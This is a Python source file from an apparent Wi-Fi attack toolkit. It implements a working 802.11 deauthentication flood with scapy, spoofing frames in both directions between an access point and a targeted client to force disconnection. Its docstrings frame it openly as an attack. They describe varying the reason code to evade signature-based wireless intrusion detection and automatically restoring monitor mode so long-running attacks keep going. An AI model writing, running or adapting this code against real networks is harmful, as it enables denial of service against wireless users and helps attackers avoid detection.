"""Deauthentication flood against an AP or a specific client."""

from __future__ import annotations

import time

from scapy.config import conf

from ..frames.craft import BROADCAST, craft_deauth
from ..radio import ensure_channel, ensure_monitor_mode, get_mode, set_monitor_active


def deauth(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    count: int = 64,
    interval: float = 0.0,
    channel: int | None = None,
    low_rate: bool = False,
    reason: int = 7,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Send count deauth rounds from bssid to client.

    When client is a real MAC (not BROADCAST), each round sends the frame
    in BOTH directions -- spoofed AP->client, then spoofed client->AP --
    matching the vendored aircrack-ng's own aireplay-ng -0/--deauth
    behavior when a target is specified (see frames.craft_deauth's
    from_client docstring for why: a frame lost in one direction can leave
    the other endpoint still thinking it's associated). BROADCAST targets
    stay one-directional since there's no single client MAC to spoof as
    the reverse frame's source. This means `count` is now a round count,
    not a raw frame count -- up to 2x that many frames actually go out for
    a targeted deauth.

    low_rate: force injection at 6 Mbps instead of the adapter's
    auto/unset rate -- see frames.craft_deauth for why. Opt-in since it
    costs airtime; most adapters don't need it.

    reason: 802.11 reason code, passed straight to frames.craft_deauth
    (default 7). Exposed so a caller can vary it round-to-round -- see
    attacks/logic.py's run_deauth_flow -- as one layer against
    signature-based WIDS detection of a fixed reason code repeated
    every round.

    stop_event: checked before every round; a set event aborts the burst
    immediately (the GUI's Stop Attack button sets it) instead of letting
    the remaining rounds play out.

    Returns the raw frame count actually handed to the OS for transmission
    (not the round count -- see above) -- 0 if iface isn't in monitor mode
    (frames can't go out at all), N if the socket died partway through (N
    frames got out before the failure).
    This is NOT proof of over-the-air reception: this hardware's TX
    packet counters (`ip -s link`) aren't instrumented for monitor-mode
    injection at all (confirmed live via a second-radio witness -- see
    STATUS.md), so there's no cheap from-Python way to verify actual RF
    transmission. What this DOES catch is the real, previously-silent
    failure mode of calling deauth() against an interface that isn't
    actually in monitor mode (e.g. a stale lock, a failed monitor-mode
    setup) -- previously sendp() would just silently succeed at the OS
    level while nothing left the radio, indistinguishable from "ran
    fine, target just didn't respond".

    Sends one frame per socket.send() call (not a single batched
    sendp(count=...)) and logs each one -- the user asked repeatedly to
    see every individual deauth frame in the log, not just a "sent N"
    summary after the fact.

    interval defaults to 0.0: aireplay-ng's own -0 <count> fires its burst
    back-to-back with no artificial per-frame delay, relying on the driver
    for pacing. An earlier 0.05s sleep between frames stretched a 64-frame
    burst out to 3.2s -- 64 separately-spaced pings instead of one dense
    burst, which is what -0 64 actually means. Still overridable by callers
    that want throttling.
    """
    log = progress_fn or (lambda msg: None)

    # Self-heal a drifted interface (NetworkManager reasserting control, a
    # driver reset, ...) instead of just bailing -- this is the exact
    # class of previously-silent failure PINCER's per-round deauth() calls
    # hit on a long-running attack: something knocks the radio back to
    # managed mid-session and every round after that silently sends 0
    # frames with no recovery.
    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- deauth frames cannot transmit")
        return 0

    # Active monitor (ACK received unicast frames) is NOT required for frame
    # injection in monitor mode; on adapters that advertise the capability,
    # toggling it performs an interface down/up cycle that tears down any OTHER
    # socket bound to the interface (e.g. the GUI's live capture socket). We
    # still request it once up front -- harmless no-op on the many adapters that
    # don't support it, and a potential TX aid on the few that do -- but we do
    # NOT toggle it back off afterward (see return below).
    set_monitor_active(iface, True)
    pkt_fwd = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate)
    # Bidirectional when a real client is targeted (2026-08-30): the vendored
    # aircrack-ng's own aireplay-ng -0/--deauth always sends both AP->client
    # and client->AP for a directed target -- a frame lost in either
    # direction alone can leave the OTHER endpoint still thinking it's
    # associated. Meaningless for BROADCAST (there's no single client MAC to
    # spoof as the reverse frame's source), so that case stays one-directional.
    pkt_rev = craft_deauth(bssid=bssid, client=client, reason=reason, low_rate=low_rate, from_client=True) if client != BROADCAST else None
    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"deauth socket open failed: {exc}")
        return 0
    sent = 0

    def _emit() -> None:
        # Send the forward (and, for a directed target, reverse) frame,
        # counting each one the moment it is handed to the OS. Raises
        # OSError on a dead socket so the caller can reopen + retry.
        nonlocal sent
        sock.send(pkt_fwd)
        sent += 1
        if pkt_rev is not None:
            sock.send(pkt_rev)
            sent += 1

    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"deauth stopped after {sent} frame(s) ({i}/{count} round(s)) -- stop requested")
                return sent
            try:
                _emit()
            except OSError:
                # Many USB WiFi dongles (Realtek/MediaTek) reset the injection
                # socket right after a transmitted frame, so the very next send
                # fails with ENETDOWN/ENODEV even though the interface is fine.
                # Without recovery here a single deauth "loses the socket" after
                # the first frame. Reopen the socket and retry the frame instead
                # of aborting the whole burst.
                try:
                    sock.close()
                except OSError:
                    pass
                try:
                    sock = conf.L2socket(iface=iface)
                except OSError as exc:
                    log(f"deauth socket reopen failed after {sent} frame(s) ({i + 1}/{count} round(s)): {exc}")
                    return sent
                try:
                    _emit()
                except OSError as exc:
                    log(f"deauth send failed after {sent} frame(s) ({i + 1}/{count} round(s)): {exc}")
                    return sent
            if pkt_rev is not None:
                log(f"deauth round {i + 1}/{count} sent (both directions): {bssid} <-> {client}")
            else:
                log(f"deauth frame {i + 1}/{count} sent: {bssid} -> {client}")
            # Unconditional sleep(interval), even at 0.0 -- see
            # auth_flood.py's note: a real syscall forces a GIL yield every
            # frame, which a falsy-guarded skip would not.
            if i < count - 1:
                time.sleep(interval)
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return sent
